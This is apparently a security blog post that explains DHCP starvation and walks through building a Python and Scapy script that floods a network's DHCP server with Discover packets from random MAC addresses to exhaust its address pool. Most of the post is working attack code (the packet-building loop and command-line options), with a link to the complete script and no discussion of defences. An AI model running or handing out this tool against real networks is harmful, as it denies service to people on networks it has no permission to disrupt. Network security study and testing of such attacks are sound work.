---
title: Performing a DHCP starvation attack
pubDate: "March 09 2024"
description: Understanding and performing a DHCP starvation attack over DHCP servers and networks.
tags: ["security", "networks", "hacking"]
heroImage: "/blog/2024-03-09-dhcp-starvation-attack/logo.png"
---

To understand what a DHCP starvation attack is, it is important to understand what a DHCP server is and how this protocol works. A DHCP server is a network component in charge of assigning IPs to different devices, associating the physical or MAC address to an IP. This process allows communication between the different devices, using the assigned IPs to identify each other and communicate.

A "DHCP starvation" attack is a type of malicious attack targeting networks that use the DHCP protocol for IP address allocation. The goal of this attack is to exhaust all the IP addresses available to the DHCP server in order to make it impossible for new devices to connect to the server, even causing a denial of service attack.

Next we are going to see how to do a small proof of concept of this attack, developing a Python script. The first thing to do is to install the necessary dependencies, in this case, the network packet manipulation library "Scapy".

```sh
pip install scapy
```

Let's start with the python code. Before starting to build packets, it is necessary to configure Scapy to ignore IP address verification responses, since we will be sending packets with forged IP addresses.

```python
conf.checkIPaddr = False
```

Once the basic configuration of Scapy is done, we move on to define our main function "starve". This function will receive a dictionary of parameters. It is not the best way to do this step, but for a quick script it is enough. The main parameters we will use will be: Delay time between each packet sent, network to attack and network interface through which we want to perform the attack.

```python
def starve(params):
    delay = params['delay'] if params.get('delay') is not None else 0.5
    network = params['network'] if params.get('network') is not None else '192.168.1.0/24'
    interface = params['interface'] if params.get('interface') is not None else 'eth0'
    is_verbose = params['verbose'] if params.get('verbose') is not None else 1
```

In the main loop of the starve function, we generate DHCP Discover packets with random MAC addresses, requesting specific IP addresses within the target network.

```python
for ip_dir in ips_for_feeding:
    src_mac = RandMAC()

    ether = Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff')
    ip = IP(src='0.0.0.0', dst='255.255.255.255')
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(op=1, chaddr=src_mac)
    dhcp = DHCP(options=[
        ('message-type', 'discover'), 
        ('requested_addr', str(ip_dir)),
        ('end')])

    packet = ether / ip / udp / bootp / dhcp

    sendp(packet, iface=interface, verbose=is_verbose)

    sleep(delay)
```

Finally and outside the function, we will add the command line arguments so that the user can specify all the above parameters. This will be done using the "argparse" library already included in python.

```python
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '--network', 
        type=str,
        nargs='?',
        help='IP address of the network (e.g. 192.168.1.0/24)',
    )
    parser.add_argument(
        '--delay', 
        type=str,
        nargs='?',
        help='Delay in seconds for each packet',
    )
    parser.add_argument(
        '--interface', 
        type=str,
        nargs='?',
        help='Interface to attack (eth0 as default)',
    )
    parser.add_argument(
        '--verbose', 
        type=int,
        nargs='?',
        help='Verbose mode 1=ON 0=OFF (1 as default)',
    )
    params = vars(parser.parse_args())
    starve(params)
```

The complete script code: [dhcp_starvation_attack.py](https://gist.github.com/jparadadev/ade6fa41d8e86f35c04bac09af86aa09)


